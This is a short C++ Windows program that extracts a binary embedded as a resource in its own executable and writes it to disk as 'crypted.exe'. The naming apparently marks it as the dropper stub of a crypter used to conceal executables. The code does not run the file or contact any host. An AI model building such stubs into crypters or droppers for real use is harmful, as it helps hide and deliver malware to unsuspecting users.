#include <Windows.h>
#include <vector>
#include <fstream>

// Gets the resource data from the currently running executable.
std::vector<char> get_resource(int id)
{
	// Vector to hold our data.
	std::vector<char> resource_data;
	size_t rsize;
	// Handle to the resource.
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCEA(69), MAKEINTRESOURCEA(id));
	// Temp handle to hold our resource data.
	HGLOBAL temp_data = LoadResource(NULL, hResource);
	// Set the size of our data.
	rsize = SizeofResource(NULL, hResource);
	// Resize the vector to match the resource size.
	resource_data.resize(rsize);
	// Copy the data from the temp variable to the vector.
	memcpy((void*)resource_data.data(), temp_data, rsize);

	return resource_data;
}

// Drops the executable on disk.
bool DropExecutable(std::vector<char> data, char* executable_name)
{
	// Create a file stream.
	std::ofstream textout(executable_name, std::ios::out | std::ios::binary);
	// fSize is used to know how much we have to write out.
	int fSize = data.size();
	try
	{
		// Try to write out the file and close the stream.
		textout.write((const char*)& data[0], fSize);
		textout.close();
		return true;
	}
	catch (const std::exception& e)
	{
		return false;
	}
}

int main()
{
	// Name of our output file.
	char output[255] = "crypted.exe";
	// Data we got from the resources.
	std::vector<char> resource_data = get_resource(10);
	// See if we actually got any data.
	if (resource_data.data())
	{
		DropExecutable(resource_data, output);
	}
}